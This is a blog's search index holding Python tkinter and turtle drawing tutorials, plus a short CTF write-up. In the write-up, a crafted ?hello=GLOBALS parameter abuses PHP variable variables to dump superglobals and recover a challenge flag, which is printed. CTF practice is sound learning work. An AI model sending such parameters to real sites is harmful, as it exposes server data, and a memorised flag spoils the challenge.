<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF-Web(1)</title>
      <link href="2021/07/15/ctf-web-1/"/>
      <url>2021/07/15/ctf-web-1/</url>
      
        <content type="html"><![CDATA[<h2 id="1、Misc-Web-爆破-1"><a href="#1、Misc-Web-爆破-1" class="headerlink" title="1、Misc Web 爆破-1"></a>1、Misc Web 爆破-1</h2><p>题目：</p><p><img src="https://z3.ax1x.com/2021/07/15/WukZRS.png" alt="WukZRS.png"></p><p>网址：<a href="http://f86c521eb14a4c24bab09b125ef368d20c50c165f0e3479a.changame.ichunqiu.com/" target="_blank" rel="noopener">http://f86c521eb14a4c24bab09b125ef368d20c50c165f0e3479a.changame.ichunqiu.com/</a></p><p>提示说flag在变量里，看到var_dump(),$$a时,就猜测是考察超全局变量GLOBALS<br>所以就构造：<a href="http://7d30e96f64ea46cebb0bb8321544000282aff8f4efd34bb1.game.ichunqiu.com/?hello=GLOBALS" target="_blank" rel="noopener">http://7d30e96f64ea46cebb0bb8321544000282aff8f4efd34bb1.game.ichunqiu.com/?hello=GLOBALS</a></p><p><img src="https://www.hualigs.cn/image/60f02d4c90f09.jpg" alt="2.PNG"></p><p>即可得到flag{75c16061-262e-4d7e-8ff0-b6b243a1580a}</p><p>7/15/2021 8:55:34 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>图形用户界面GUI（二）</title>
      <link href="2021/03/31/tu-xing-yong-hu-jie-mian-gui-er/"/>
      <url>2021/03/31/tu-xing-yong-hu-jie-mian-gui-er/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Python绘图模块概述"><a href="#一、Python绘图模块概述" class="headerlink" title="一、Python绘图模块概述"></a>一、Python绘图模块概述</h2><ul><li>Python标准库中包括下列图形绘制相关模块<ul><li>（1）tkinter：画布绘图</li><li>（2）turtle：海龟绘图</li></ul></li></ul><h2 id="二、基于tkinter的图形绘制"><a href="#二、基于tkinter的图形绘制" class="headerlink" title="二、基于tkinter的图形绘制"></a>二、基于tkinter的图形绘制</h2><ul><li>Canvas（画布）是一个长方形的区域，用于图形绘制或复杂的图形界面布局，可以在画布上绘制图形、文字，放置各种组件和框架</li><li>Canvas组件对象包括下列方法（绘制函数），用于绘制各种图形对象<br><img src="https://www.hualigs.cn/image/6064648325edf.jpg" alt=""></li></ul><h3 id="1-创建画布对象"><a href="#1-创建画布对象" class="headerlink" title="1.创建画布对象"></a>1.创建画布对象</h3><p>画布的左上角为坐标原点(0,0)，右下角为画布的大小(x,y)<br>  c=tkinter.Canvas(parent,option=value,…)</p><p><strong>例1：创建一个大小为200*100、背景为黄色的画布</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token operator">=</span>Canvas<span class="token punctuation">(</span>root<span class="token punctuation">,</span>bg<span class="token operator">=</span><span class="token string">'yellow'</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span>    c<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的pack方法，调整其显示位置和大小</span></code></pre><h3 id="2-绘制矩形"><a href="#2-绘制矩形" class="headerlink" title="2.绘制矩形"></a>2.绘制矩形</h3><p>在Canvas对象c上绘制线条（直线或折线）的方法如下：<br>  id=c.create_rectangle(x0,y0,x1,y1,option,…)<br>（(x0,y0)代表图形左上角，(x1,y1)代表图形右下角）</p><p><strong>例2：矩形绘制示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token operator">=</span>Canvas<span class="token punctuation">(</span>root<span class="token punctuation">,</span>bg<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">130</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">70</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建并显示Canvas</span>c<span class="token punctuation">.</span>create_rectangle<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>fill<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#红色填充矩形</span>c<span class="token punctuation">.</span>create_rectangle<span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>fill<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">,</span>outline<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#蓝色边框红色填充矩形，边框宽度为5</span></code></pre><h3 id="3-绘制椭圆"><a href="#3-绘制椭圆" class="headerlink" title="3.绘制椭圆"></a>3.绘制椭圆</h3><p>在Canvas对象c上绘制椭圆的对象方法如下：<br>  id=c.create_oval(x0,y0,x1,y1,option,…)<br>（(x0,y0)代表图形左上角，(x1,y1)代表图形右下角）</p><p><strong>例3：椭圆绘制示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token operator">=</span>Canvas<span class="token punctuation">(</span>root<span class="token punctuation">,</span>bg<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">280</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">70</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>create_oval<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>fill<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#红色填充椭圆</span>c<span class="token punctuation">.</span>create_oval<span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>fill<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">,</span>outline<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#红色填充蓝色边框宽度为5的椭圆</span>c<span class="token punctuation">.</span>create_oval<span class="token punctuation">(</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span>dash<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#虚线椭圆</span>c<span class="token punctuation">.</span>create_oval<span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">270</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span>dash<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#宽度为2的虚线椭圆</span></code></pre><h3 id="4-绘制圆弧"><a href="#4-绘制圆弧" class="headerlink" title="4.绘制圆弧"></a>4.绘制圆弧</h3><p>在Canvas对象c上绘制圆弧的方法如下：<br>  id=c.create_arc(x0,y0,x1,y1,option,…)<br>（(x0,y0)代表图形左上角，(x1,y1)代表图形右下角）</p><ul><li>选项style用于设置圆弧的样式<br><img src="https://www.hualigs.cn/image/60646483a78a1.jpg" alt=""></li></ul><p><strong>例4：圆弧绘制示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token operator">=</span>Canvas<span class="token punctuation">(</span>root<span class="token punctuation">,</span>bg<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">250</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">70</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>create_arc<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>style<span class="token operator">=</span>PIESLICE<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绘制PIESLICE样式圆弧</span>c<span class="token punctuation">.</span>create_arc<span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>style<span class="token operator">=</span>CHORD<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绘制CHORD样式圆弧</span>c<span class="token punctuation">.</span>create_arc<span class="token punctuation">(</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>style<span class="token operator">=</span>ARC<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绘制ARC样式圆弧</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#绘制菊花瓣蓝色边框红色填充的图形</span>    c<span class="token punctuation">.</span>create_arc<span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>fill<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">,</span>outline<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>start<span class="token operator">=</span>i<span class="token punctuation">,</span>extent<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span></code></pre><h3 id="5-绘制线条"><a href="#5-绘制线条" class="headerlink" title="5.绘制线条"></a>5.绘制线条</h3><p>在Canvas对象c上绘制线条（直线或折线）的方法如下：</p><p>  id=c.create_line(x0,y0,x1,y1,…,xn,yn,option,…)</p><p><strong>例5：线条绘制示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token operator">=</span>Canvas<span class="token punctuation">(</span>root<span class="token punctuation">,</span>bg<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">250</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">70</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>create_line<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>arrow<span class="token operator">=</span>BOTH<span class="token punctuation">,</span>arrowshape<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#双向箭头</span>c<span class="token punctuation">.</span>create_line<span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#折线</span>c<span class="token punctuation">.</span>create_line<span class="token punctuation">(</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>arrow<span class="token operator">=</span>BOTH<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Z字型双向箭头</span>c<span class="token punctuation">.</span>create_line<span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">190</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>joinstyle<span class="token operator">=</span>MITZER<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Z字型</span></code></pre><h3 id="6-绘制多边形"><a href="#6-绘制多边形" class="headerlink" title="6.绘制多边形"></a>6.绘制多边形</h3><p>在Canvas对象c上绘制多边形的对象方法如下：</p><p>  id=c.create_polygon(x0,y0,x1,y1,…,option,…)</p><p><strong>例6：多边形绘制示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token operator">=</span>Canvas<span class="token punctuation">(</span>root<span class="token punctuation">,</span>bg<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">250</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">70</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>create_polygon<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>fill<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span>outline<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#黑边等腰三角形</span>c<span class="token punctuation">.</span>create_polygon<span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>fill<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span>outline<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#黑边直角三角形</span>c<span class="token punctuation">.</span>create_polygon<span class="token punctuation">(</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#黑色填充的正方形</span>c<span class="token punctuation">.</span>create_polygon<span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">190</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>fill<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span>outline<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#对顶三角形</span></code></pre><h3 id="7-绘制字符串"><a href="#7-绘制字符串" class="headerlink" title="7.绘制字符串"></a>7.绘制字符串</h3><p>在Canvas对象c上绘制字符串的对象方法如下：</p><p>  id=c.create_text(x,y,option,…)</p><ul><li>其中，(x,y)是字符串放置的中心坐标；option为选项，包括：activefill、activestipple、anchor、disabledfill、disabledstipple、fill、font、justify、offset、state、stipple、tags、text、width。其中，text用于指定要绘制的字符串；font用于指定字体；justify用于指定对齐方式</li></ul><h2 id="三、基于turtle模块的海龟绘图"><a href="#三、基于turtle模块的海龟绘图" class="headerlink" title="三、基于turtle模块的海龟绘图"></a>三、基于turtle模块的海龟绘图</h2><ul><li>所谓的海龟绘图，即假定一只海龟（海龟带着一只钢笔）在一个屏幕上来回移动，当它移动时会绘制直线。海龟可以沿直线移动指定的距离，也可以旋转一个指定的角度</li><li>通过编写代码，可以控制海龟移动和绘图，从而绘制出图形</li></ul><h3 id="1-tuetle模块概述"><a href="#1-tuetle模块概述" class="headerlink" title="1.tuetle模块概述"></a>1.tuetle模块概述</h3><ul><li>（1）导入turtle模块</li><li>（2）创建海龟对象（turtle模块同时实现了函数模式，故也可以不创建海龟对象，直接调用函数绘图）</li><li>（3）设置海龟的绘图属性（画笔的属性，颜色、画线的宽度）</li><li>（4）控制和操作海龟绘图<ul><li>pensize(width)/width(width)    #绘制图形时的宽度</li><li>color(colorstring)    #绘制图形时的画笔颜色和填充颜色</li><li>pencolor(colorstring)    #绘制图形的画笔颜色</li><li>fillcolor(colorstring)    #绘制图形的填充颜色</li></ul></li></ul><h3 id="2-控制和操作海龟绘图"><a href="#2-控制和操作海龟绘图" class="headerlink" title="2.控制和操作海龟绘图"></a>2.控制和操作海龟绘图</h3><p><img src="https://www.hualigs.cn/image/60646485b2779.jpg" alt=""></p><p><strong>例7：使用海龟绘图绘制一个正方形</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> turtlep<span class="token operator">=</span>turtle<span class="token punctuation">.</span>Turtle<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建海龟对象</span>p<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">"red"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置绘制时画笔的颜色</span>p<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义绘制时画笔的线条宽度</span>turtle<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义绘图的速度（“slowest”或者1均表示最慢）</span>p<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#移动海龟到坐标原点(0,0)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>forward<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#向前移动100</span>    p<span class="token punctuation">.</span>right<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#向右旋转90°</span></code></pre><p><strong>例8：使用海龟绘图绘制三角形、正方形、正五边形、……、正十边形等多边形</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> turtle<span class="token keyword">def</span> <span class="token function">draw_polygon</span><span class="token punctuation">(</span>sides<span class="token punctuation">,</span>side_len<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#绘制指定边长度的多边形</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>sides<span class="token punctuation">)</span><span class="token punctuation">:</span>        turtle<span class="token punctuation">.</span>forward<span class="token punctuation">(</span>side_len<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绘制边长</span>        turtle<span class="token punctuation">.</span>left<span class="token punctuation">(</span><span class="token number">360.0</span><span class="token operator">/</span>sides<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#旋转角度</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            step<span class="token operator">=</span><span class="token number">50</span>    <span class="token comment" spellcheck="true">#边长（海龟步长）为50</span>        draw_polygon<span class="token punctuation">(</span>i<span class="token punctuation">,</span>step<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绘制多边形</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong>例9：使用海龟绘图分别绘制红、蓝、绿、黄四种颜色的圆形螺旋</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> turtlep<span class="token operator">=</span>turtle<span class="token punctuation">.</span>Turtle<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义绘图速度（“fastest”或者0均表示最快）</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"red"</span><span class="token punctuation">,</span><span class="token string">"blue"</span><span class="token punctuation">,</span><span class="token string">"green"</span><span class="token punctuation">,</span><span class="token string">"yellow"</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span>colors<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置画笔颜色</span>    p<span class="token punctuation">.</span>circle<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>left<span class="token punctuation">(</span><span class="token number">91</span><span class="token punctuation">)</span></code></pre><p><strong>例10：科赫曲线（KOCHCURVE）的绘制</strong></p><p>n阶科赫曲线的递归绘制算法步骤如下：<br>（1）基本情况（当n=0时）：绘制一条直线<br>（2）递归步骤（当n≥1时）：绘制一条阶数为n-1的科赫曲线，向左旋转60°，绘制第二条阶数为n-1的科赫曲线；向右旋转120°，绘制第三条阶数为n-1的科赫曲线；向左旋转60°，绘制第四条阶数为n-1的科赫曲线</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> turtle<span class="token keyword">def</span> <span class="token function">koch</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> n<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>    turtle<span class="token punctuation">.</span>fd<span class="token punctuation">(</span>size<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">:</span>      turtle<span class="token punctuation">.</span>left<span class="token punctuation">(</span>i<span class="token punctuation">)</span>      koch<span class="token punctuation">(</span>size<span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">,</span>n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  turtle<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">)</span>  turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>  turtle<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  turtle<span class="token punctuation">.</span>hideturtle<span class="token punctuation">(</span><span class="token punctuation">)</span>  turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>  turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>  level<span class="token operator">=</span><span class="token number">4</span>  koch<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span>level<span class="token punctuation">)</span>  turtle<span class="token punctuation">.</span>right<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span>  koch<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> level<span class="token punctuation">)</span>  turtle<span class="token punctuation">.</span>right<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span>  koch<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> level<span class="token punctuation">)</span>  turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>  turtle<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/31/2021 8:08:22 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>图形用户界面GUI(一)</title>
      <link href="2021/03/28/tu-xing-yong-hu-jie-mian-gui-yi/"/>
      <url>2021/03/28/tu-xing-yong-hu-jie-mian-gui-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Python下常用GUI、使用优缺点对比"><a href="#一、Python下常用GUI、使用优缺点对比" class="headerlink" title="一、Python下常用GUI、使用优缺点对比"></a>一、Python下常用GUI、使用优缺点对比</h2><p><img src="https://www.hualigs.cn/image/6060707a41453.jpg" alt=""></p><h2 id="二、tkinter（Tk-interface，tk接口）"><a href="#二、tkinter（Tk-interface，tk接口）" class="headerlink" title="二、tkinter（Tk interface，tk接口）"></a>二、tkinter（Tk interface，tk接口）</h2><p>Tk图形用户界面工具包标准的Python接口</p><h3 id="1-tkinter模块"><a href="#1-tkinter模块" class="headerlink" title="1.tkinter模块"></a>1.tkinter模块</h3><ul><li>_tkinter、tkinter和tkinter.constants<ul><li>_tkinter是二进制扩展模块，提供了对Tk的低级接口，应用级程序员不会直接使用。_tkinter通常是一个共享库（或DLL），但是在一些情况下也可以被Python解释器静态链接</li><li>tkinter是主要是用的模块，导入tkinter时，会自动导入tkinter.constants。tkinter.constants模块定义了 许多常量</li></ul></li></ul><h3 id="2-图形用户界面构成"><a href="#2-图形用户界面构成" class="headerlink" title="2.图形用户界面构成"></a>2.图形用户界面构成</h3><ul><li>一个顶层窗口（也称根窗口、主窗口）</li><li>通过类Tk的无参构造函数，可以创建应用程序主窗口</li></ul><p><strong>例1：创建图形用户界面HELLO WORLD程序</strong> </p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#创建应用程序主窗口。在应用程序主窗口中，单击“Hello”按钮，将弹出“Hello,world!”消息框</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建1个Tk根窗口组件root</span>btnSayHi<span class="token operator">=</span>Button<span class="token punctuation">(</span>root<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建1个按钮组件btnSayHi，作为root的子组件</span>btnSayHi<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Hello"</span>    <span class="token 